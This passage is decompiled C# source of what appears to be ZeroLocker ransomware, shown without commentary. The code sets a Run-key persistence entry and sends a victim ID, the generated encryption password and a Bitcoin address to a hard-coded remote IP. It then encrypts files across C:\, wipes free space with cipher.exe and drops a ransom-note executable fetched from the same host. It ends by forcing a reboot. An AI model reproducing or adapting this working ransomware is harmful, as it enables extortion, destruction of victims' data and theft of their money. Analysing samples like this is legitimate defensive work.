					if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\UNLOCK YOUR FILES.exe"))
					{
						goto end_IL_0001_3;
					}
					goto IL_00a1;
					IL_00a1:
					num = 10;
					dlDesktopFile();
					goto end_IL_0001_3;
					IL_00b0:
					num = 13;
					goto IL_00b3;
					IL_00b3:
					num = 14;
					dlMainFile();
					goto IL_00bd;
					IL_00bd:
					num = 15;
					((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "FileRescue", (object)"C:\\ZeroLocker\\ZeroRescue.exe");
					goto IL_00de;
					IL_00de:
					num = 16;
					text3 = GetuID();
					goto IL_00e9;
					IL_00e9:
					num = 17;
					text4 = Conversions.ToString(getPassword());
					goto IL_00f9;
					IL_00f9:
					num = 18;
					text5 = Conversions.ToString(UseBitcoinAddress());
					goto IL_0109;
					IL_0109:
					num = 19;
					address2 = "http://5.199.171.47/zImprimer/" + text3 + "-" + text4 + "-" + text5;
					goto IL_014a;
					IL_014a:
					num = 20;
					fileName2 = "C:\\ZeroLocker\\temp.dat";
					goto IL_0154;
					IL_0154:
					num = 21;
					webClient2 = new WebClient();
					goto IL_015e;
					IL_015e:
					num = 22;
					webClient2.DownloadFile(address2, fileName2);
					goto IL_016c;
					IL_016c:
					num = 23;
					path = "C:\\";
					goto IL_0176;
					IL_0176:
					num = 24;
					EncryptFiles(path, text4);
					goto IL_0184;
					IL_0184:
					num = 25;
					address3 = "http://5.199.171.47/enc/1";
					goto IL_018e;
					IL_018e:
					num = 26;
					fileName3 = "C:\\ZeroLocker\\log.dat";
					goto IL_0198;
					IL_0198:
					num = 27;
					webClient3 = new WebClient();
					goto IL_01a2;
					IL_01a2:
					num = 28;
					webClient3.DownloadFile(address3, fileName3);
					goto IL_01b0;
					IL_01b0:
					num = 29;
					process = new Process();
					goto IL_01ba;
					IL_01ba:
					num = 30;
					processStartInfo = new ProcessStartInfo();
					goto IL_01c4;
					IL_01c4:
					num = 31;
					process.StandardOutput.ReadToEnd();
					goto IL_01d4;
					IL_01d4:
					num = 32;
					processStartInfo.Arguments = "/w:C:\\";
					goto IL_01e3;
					IL_01e3:
					num = 33;
					processStartInfo.FileName = "cipher.exe";
					goto IL_01f2;
					IL_01f2:
					num = 34;
					processStartInfo.UseShellExecute = false;
					goto IL_01fd;
					IL_01fd:
					num = 35;
					processStartInfo.CreateNoWindow = true;
					goto IL_0208;
					IL_0208:
					num = 36;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					goto IL_0213;
					IL_0213:
					num = 37;
					process.StartInfo = processStartInfo;
					goto IL_021f;
					IL_021f:
					num = 38;
					process.Start();
					goto IL_022a;
					IL_022a:
					num = 39;
					process.StandardOutput.ReadToEnd();
					goto IL_023a;
					IL_023a:
					num = 40;
					process.WaitForExit();
					goto IL_0244;
					IL_0244:
					num = 41;
					dlDesktopFile();
					goto IL_024e;
					end_IL_0001_2:
					break;
				}
				num = 46;
				Process.Start("shutdown", "/r /t 0 /f");
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 880;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public object dlDesktopFile()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string address = default(string);
		string fileName = default(string);
		WebClient webClient = default(WebClient);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 104:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_0028;
						case 5:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 6:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_000a:
					num = 2;
					address = "http://5.199.171.47/patriote/sansviolence";
					goto IL_0013;
					IL_0013:
					num = 3;
					fileName = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\UNLOCK YOUR FILES.exe";
					goto IL_0028;
					IL_0028:
					num = 4;
					webClient = new WebClient();
					break;
					end_IL_0001_2:
					break;
				}
				num = 5;
				webClient.DownloadFile(address, fileName);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 104;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public object dlMainFile()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string address = default(string);
		string fileName = default(string);
		WebClient webClient = default(WebClient);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 131:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001a;
						case 4:
						case 5:
							goto IL_0027;
						case 6:
							goto IL_002f;
						case 7:
							goto IL_0037;
						case 8:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 9:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0027:
					num = 5;
					address = "http://5.199.171.47/patriote/sansviolence";
					goto IL_002f;
					IL_002f:
					num = 6;
					fileName = "C:\\ZeroLocker\\ZeroRescue.exe";
					goto IL_0037;
					IL_001a:
					num = 3;
					Directory.CreateDirectory("C:\\ZeroLocker");
					goto IL_0027;
					IL_0037:
					num = 7;
					webClient = new WebClient();
					break;
					IL_0009:
					num = 2;
					if (!Directory.Exists("C:\\ZeroLocker"))
					{
						goto IL_001a;
					}
					goto IL_0027;
					end_IL_0001_2:
					break;
				}
				num = 8;
				webClient.DownloadFile(address, fileName);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 131;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public string GetuID()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 107:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 4:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0009:
					num = 2;
					text = Conversions.ToString(NewLateBinding.LateGet((object)null, typeof(Crc32), "ComputeChecksum", new object[1] { RuntimeHelpers.GetObjectValue(GetMAC()) }, (string[])null, (Type[])null, (bool[])null));
					break;
					end_IL_0001_2:
					break;
				}
				num = 3;
				text2 = text;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 107;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		string result = text2;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public object GetBitcoinAddress()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Random random = default(Random);
		WebClient webClient = default(WebClient);
		string text = default(string);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 127:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_0024;
						case 5:
							goto IL_002d;
						case 6:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 7:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0013:
					num = 3;
					num5 = random.Next(1, 181000);
					goto IL_0024;
					IL_0024:
					num = 4;
					webClient = new WebClient();
					goto IL_002d;
					IL_000a:
					num = 2;
					random = new Random();
					goto IL_0013;
					IL_002d:
					num = 5;
					text = webClient.DownloadString("http://5.199.171.47/zConfig/" + Conversions.ToString(num5));
					break;
					end_IL_0001_2:
					break;
				}
				num = 6;
				obj = text;
				break;
				end_IL_0001:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0001_dispatch = 127;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		object result = obj;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public object UseBitcoinAddress()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		TextReader textReader = default(TextReader);
		string text2 = default(string);
		string text3 = default(string);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 316:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0017;
						case 4:
							goto IL_0024;
						case 5:
							goto IL_002d;
						case 6:
							goto IL_0056;
						case 8:
							goto IL_0063;
						case 9:
							goto IL_0065;
						case 7:
						case 10:
						case 11:
							goto IL_0075;
						case 12:
							goto IL_0089;
						case 13:
						case 14:
							goto IL_0093;
						case 15:
							goto IL_00a5;
						case 16:
						case 17:
							goto IL_00b3;
						case 18:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 19:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0093:
					num = 14;
					if (!Directory.Exists("C:\\ZeroLocker"))
					{
						goto IL_00a5;
					}
					goto IL_00b3;
					IL_00a5:
					num = 15;
					Directory.CreateDirectory("C:\\ZeroLocker");
					goto IL_00b3;
					IL_0089:
					num = 12;
					text = "1BiXC9sJA1q3kfCQqLs1ibPqkdapRtPZX5";
					goto IL_0093;
					IL_00b3:
					num = 17;
					((ServerComputer)Class1.Class0_0).get_FileSystem().WriteAllText("C:\\ZeroLocker\\address.dat", text, false);
					break;
					IL_0009:
					num = 2;
					if (File.Exists("C:\\ZeroLocker\\address.dat"))
					{
						goto IL_0017;
					}
					goto IL_0063;
					IL_0017:
					num = 3;
					textReader = new StreamReader("C:\\ZeroLocker\\address.dat");
					goto IL_0024;
					IL_0024:
					num = 4;
					text2 = textReader.ReadToEnd();
					goto IL_002d;
					IL_002d:
					num = 5;
					text3 = Strings.Replace(Strings.Replace(text2, "\n", "", 1, -1, (CompareMethod)0), "\r", "", 1, -1, (CompareMethod)0);
					goto IL_0056;
					IL_0056:
					num = 6;
					text = text3.ToString();
					goto IL_0075;
					IL_0063:
					num = 8;
					goto IL_0065;
					IL_0065:
					num = 9;
					text = Conversions.ToString(GetBitcoinAddress());
					goto IL_0075;
					IL_0075:
					num = 11;
					if (!text.StartsWith("1"))
					{
						goto IL_0089;
					}
					goto IL_0093;
					end_IL_0001_2:
					break;
				}
				num = 18;
				obj = text;
				break;
				end_IL_0001:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0001_dispatch = 316;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		object result = obj;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public object getPassword()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int startIndex = default(int);
		Random random = default(Random);
		StringBuilder stringBuilder = default(StringBuilder);
		string text = default(string);
		int num5 = default(int);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num6;
				int num7;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 178:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_001c;
						case 5:
							goto IL_0025;
						case 7:
							goto IL_002d;
						case 8:
							goto IL_0040;
						case 6:
							goto IL_0053;
						case 9:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 10:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0053:
					num = 6;
					startIndex = random.Next(0, 61);
					goto IL_002d;
					IL_002d:
					num = 7;
					stringBuilder.Append(text.Substring(startIndex, 1));
					goto IL_0040;
					IL_0025:
					num = 5;
					num5 = 1;
					goto IL_0053;
					IL_0040:
					num = 8;
					num5 = checked(num5 + 1);
					num6 = num5;
					num7 = 20;
					if (num6 > num7)
					{
						break;
					}
					goto IL_0053;
					IL_000a:
					num = 2;
					text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
					goto IL_0013;
					IL_0013:
					num = 3;
					random = new Random();
					goto IL_001c;
					IL_001c:
					num = 4;
					stringBuilder = new StringBuilder();
					goto IL_0025;
					end_IL_0001_2:
					break;
				}
				num = 9;
				obj = stringBuilder.ToString();
				break;
				end_IL_0001:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0001_dispatch = 178;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		object result = obj;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public bool EncryptFiles(string Path, string txtPassEncryptRaw)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string string_ = default(string);
		FileInfo fileInfo = default(FileInfo);
		string string_2 = default(string);
		string fullName = default(string);
		byte[] byte_ = default(byte[]);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		DirectoryInfo[] directories = default(DirectoryInfo[]);
		int num5 = default(int);
		DirectoryInfo directoryInfo2 = default(DirectoryInfo);
		byte[] byte_2 = default(byte[]);
		FileInfo[] files = default(FileInfo[]);
		int num6 = default(int);
		string name = default(string);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 537:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_0030;
						case 5:
							goto IL_0052;
						case 6:
							goto IL_005d;
						case 8:
							goto IL_0070;
						case 9:
							goto IL_0072;
						case 10:
							goto IL_0083;
						case 12:
							goto IL_0100;
						case 13:
							goto IL_0103;
						case 14:
							goto IL_010f;
						case 15:
							goto IL_0125;
						case 16:
							goto IL_012b;
						case 17:
							goto IL_0138;
						case 18:
							goto IL_0145;
						case 21:
							goto IL_0159;
						case 22:
							goto IL_0161;
						case 23:
							goto IL_0172;
						case 24:
							goto IL_0184;
						case 25:
							goto IL_018a;
						case 7:
						case 11:
						case 19:
						case 20:
							goto IL_0192;
						default:
							goto end_IL_0001;
						case 26:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_010f:
					num = 14;
					string_ = fileInfo.FullName + ".encrypt";
					goto IL_0125;
					IL_0125:
					num = 15;
					string_2 = txtPassEncryptRaw;
					goto IL_012b;
					IL_0103:
					num = 13;
					fullName = fileInfo.FullName;
					goto IL_010f;
					IL_012b:
					num = 16;
					byte_ = method_0(string_2);
					goto IL_0138;
					IL_0009:
					num = 2;
					directoryInfo = new DirectoryInfo(Path);
					goto IL_0012;
					IL_0012:
					num = 3;
					directories = directoryInfo.GetDirectories();
					num5 = 0;
					goto IL_001e;
					IL_001e:
					if (num5 < directories.Length)
					{
						directoryInfo2 = directories[num5];
						goto IL_0030;
					}
					goto end_IL_0001_2;
					IL_0138:
					num = 17;
					byte_2 = method_1(string_2);
					goto IL_0145;
					IL_0030:
					num = 4;
					files = directoryInfo2.GetFiles();
					num6 = 0;
					goto IL_003e;
					IL_003e:
					if (num6 < files.Length)
					{
						fileInfo = files[num6];
						goto IL_0052;
					}
					goto IL_0161;
					IL_0145:
					num = 18;
					method_2(fullName, string_, byte_, byte_2, Enum0.const_0);
					goto IL_0192;
					IL_0052:
					num = 5;
					name = fileInfo.get_Name();
					goto IL_005d;
					IL_005d:
					num = 6;
					if (!name.EndsWith("encrypt"))
					{
						goto IL_0070;
					}
					goto IL_0192;
					IL_0070:
					num = 8;
					goto IL_0072;
					IL_0072:
					num = 9;
					text = Conversions.ToString(fileInfo.Length);
					goto IL_0083;
					IL_0083:
					num = 10;
					if ((!(Conversions.ToDouble(text) > 20000000.0) && !fileInfo.FullName.Contains("Windows") && !fileInfo.FullName.Contains("Program Files") && !fileInfo.FullName.Contains("WINDOWS") && !fileInfo.FullName.Contains("ZeroLocker") && !fileInfo.FullName.Contains("Desktop")) || 1 == 0)
					{
						goto IL_0100;
					}
					goto IL_0192;
					IL_0159:
					num = 21;
					goto IL_003e;
					IL_0161:
					num = 22;
					if (directoryInfo2.GetDirectories().Length > 0)
					{
						goto IL_0172;
					}
					goto IL_0184;
					IL_0172:
					num = 23;
					EncryptFiles(directoryInfo2.FullName, txtPassEncryptRaw);
					goto IL_0184;
					IL_0184:
					num5 = checked(num5 + 1);
					goto IL_018a;
					IL_018a:
					num = 25;
					goto IL_001e;
					IL_0192:
					num6 = checked(num6 + 1);
					goto IL_0159;
					IL_0100:
					num = 12;
					goto IL_0103;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 537;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		bool result = default(bool);
		return result;
	}

	public bool DecryptFiles(string Path, string DecryptKey)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string fullName = default(string);
		FileInfo fileInfo = default(FileInfo);
		string string_ = default(string);
		byte[] byte_ = default(byte[]);
		string string_2 = default(string);
		byte[] byte_2 = default(byte[]);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		DirectoryInfo[] directories = default(DirectoryInfo[]);
		int num5 = default(int);
		DirectoryInfo directoryInfo2 = default(DirectoryInfo);
		int num6 = default(int);
		FileInfo[] files = default(FileInfo[]);
		string name = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0009;
					case 393:
						{
							num2 = num;
							switch ((num3 <= -2) ? 1 : num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_0012;
							case 4:
								goto IL_0029;
							case 5:
								goto IL_0043;
							case 6:
								goto IL_004e;
							case 7:
								goto IL_005e;
							case 8:
								goto IL_0068;
							case 9:
								goto IL_007c;
							case 10:
								goto IL_0082;
							case 11:
								goto IL_008f;
							case 12:
								goto IL_009c;
							case 13:
								goto IL_00a8;
							case 14:
								goto IL_00be;
							case 15:
								goto IL_00d0;
							case 16:
								goto IL_00d6;
							case 17:
								goto IL_00e6;
							case 18:
								goto IL_00f7;
							case 19:
								goto IL_0109;
							case 20:
								goto IL_010f;
							default:
								goto end_IL_0001;
							case 21:
								goto end_IL_0001_2;
							}
							goto default;
						}
						IL_009c:
						num = 12;
						fullName = fileInfo.FullName;
						goto IL_00a8;
						IL_00a8:
						num = 13;
						string_ = fullName.Substring(0, fullName.Length - 8);
						goto IL_00be;
						IL_008f:
						num = 11;
						byte_ = method_1(string_2);
						goto IL_009c;
						IL_00be:
						num = 14;
						method_2(fullName, string_, byte_2, byte_, Enum0.const_1);
						goto IL_00d0;
						IL_0009:
						num = 2;
						directoryInfo = new DirectoryInfo(Path);
						goto IL_0012;
						IL_0012:
						num = 3;
						directories = directoryInfo.GetDirectories();
						num5 = 0;
						goto IL_0112;
						IL_0112:
						if (num5 < directories.Length)
						{
							directoryInfo2 = directories[num5];
							goto IL_0029;
						}
						goto end_IL_0001_2;
						IL_00d0:
						num6++;
						goto IL_00d6;
						IL_0029:
						num = 4;
						files = directoryInfo2.GetFiles();
						num6 = 0;
						goto IL_00d9;
						IL_00d9:
						if (num6 < files.Length)
						{
							fileInfo = files[num6];
							goto IL_0043;
						}
						goto IL_00e6;
						IL_00e6:
						num = 17;
						if (directoryInfo2.GetDirectories().Length > 0)
						{
							goto IL_00f7;
						}
						goto IL_0109;
						IL_00f7:
						num = 18;
						DecryptFiles(directoryInfo2.FullName, DecryptKey);
						goto IL_0109;
						IL_0109:
						num5++;
						goto IL_010f;
						IL_010f:
						num = 20;
						goto IL_0112;
						IL_00d6:
						num = 16;
						goto IL_00d9;
						IL_0043:
						num = 5;
						name = fileInfo.get_Name();
						goto IL_004e;
						IL_004e:
						num = 6;
						if (name.EndsWith("encrypt"))
						{
							goto IL_005e;
						}
						goto IL_00d0;
						IL_005e:
						num = 7;
						_ = fileInfo.FullName;
						goto IL_0068;
						IL_0068:
						num = 8;
						_ = fileInfo.FullName + ".encrypt";
						goto IL_007c;
						IL_007c:
						num = 9;
						string_2 = DecryptKey;
						goto IL_0082;
						IL_0082:
						num = 10;
						byte_2 = method_0(string_2);
						goto IL_008f;
						end_IL_0001:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 393;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		bool result = default(bool);
		return result;
	}

	private byte[] method_0(string string_2)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		byte[] array = default(byte[]);
		int num8 = default(int);
		char[] array2 = default(char[]);
		byte[] array3 = default(byte[]);
		byte[] array4 = default(byte[]);
		int upperBound = default(int);
		int upperBound2 = default(int);
		SHA512Managed sHA512Managed = default(SHA512Managed);
		byte[] array5 = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					int num6;
					int num9;
					int num7;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_000a;
					case 271:
						{
							num2 = num;
							switch ((num3 <= -2) ? 1 : num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_000a;
							case 3:
								goto IL_0014;
							case 4:
								goto IL_0020;
							case 5:
								goto IL_002d;
							case 6:
								goto IL_003e;
							case 7:
								goto IL_004f;
							case 8:
								goto IL_0062;
							case 9:
								goto IL_006c;
							case 10:
								goto IL_0079;
							case 11:
								goto IL_0085;
							case 13:
								goto IL_008e;
							case 12:
								goto IL_00a2;
							case 14:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 15:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_008e:
						num = 13;
						num5++;
						num6 = num5;
						num7 = 31;
						if (num6 > num7)
						{
							break;
						}
						goto IL_00a2;
						IL_003e:
						num = 6;
						array[num8] = (byte)Strings.Asc(array2[num8]);
						goto IL_004f;
						IL_00a2:
						num = 12;
						array3[num5] = array4[num5];
						goto IL_008e;
						IL_004f:
						num = 7;
						num8++;
						goto IL_0058;
						IL_000a:
						num = 2;
						array2 = string_2.ToCharArray();
						goto IL_0014;
						IL_0014:
						num = 3;
						upperBound = array2.GetUpperBound(0);
						goto IL_0020;
						IL_0020:
						num = 4;
						array = new byte[upperBound + 1];
						goto IL_002d;
						IL_002d:
						num = 5;
						upperBound2 = array2.GetUpperBound(0);
						num8 = 0;
						goto IL_0058;
						IL_0058:
						num9 = num8;
						num7 = upperBound2;
						if (num9 <= num7)
						{
							goto IL_003e;
						}
						goto IL_0062;
						IL_0062:
						num = 8;
						sHA512Managed = new SHA512Managed();
						goto IL_006c;
						IL_006c:
						num = 9;
						array4 = sHA512Managed.ComputeHash(array);
						goto IL_0079;
						IL_0079:
						num = 10;
						array3 = new byte[32];
						goto IL_0085;
						IL_0085:
						num = 11;
						num5 = 0;
						goto IL_00a2;
						end_IL_0001_2:
						break;
					}
					num = 14;
					array5 = array3;
					break;
				}
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 271;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		byte[] result = array5;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private byte[] method_1(string string_2)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		byte[] array = default(byte[]);
		int num8 = default(int);
		char[] array2 = default(char[]);
		byte[] array3 = default(byte[]);
		byte[] array4 = default(byte[]);
		int upperBound = default(int);
		int upperBound2 = default(int);
		SHA512Managed sHA512Managed = default(SHA512Managed);
		byte[] array5 = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					int num6;
					int num9;
					int num7;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_000a;
					case 275:
						{
							num2 = num;
							switch ((num3 <= -2) ? 1 : num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_000a;
							case 3:
								goto IL_0014;
							case 4:
								goto IL_0020;
							case 5:
								goto IL_002d;
							case 6:
								goto IL_003e;
							case 7:
								goto IL_004f;
							case 8:
								goto IL_0062;
							case 9:
								goto IL_006c;
							case 10:
								goto IL_0079;
							case 11:
								goto IL_0085;
							case 13:
								goto IL_008f;
							case 12:
								goto IL_00a3;
							case 14:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 15:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_008f:
						num = 13;
						num5++;
						num6 = num5;
						num7 = 47;
						if (num6 > num7)
						{
							break;
						}
						goto IL_00a3;
						IL_003e:
						num = 6;
						array[num8] = (byte)Strings.Asc(array2[num8]);
						goto IL_004f;
						IL_00a3:
						num = 12;
						array3[num5 - 32] = array4[num5];
						goto IL_008f;
						IL_004f:
						num = 7;
						num8++;
						goto IL_0058;
						IL_000a:
						num = 2;
						array2 = string_2.ToCharArray();
						goto IL_0014;
						IL_0014:
						num = 3;
						upperBound = array2.GetUpperBound(0);
						goto IL_0020;
						IL_0020:
						num = 4;
						array = new byte[upperBound + 1];
						goto IL_002d;
						IL_002d:
						num = 5;
						upperBound2 = array2.GetUpperBound(0);
						num8 = 0;
						goto IL_0058;
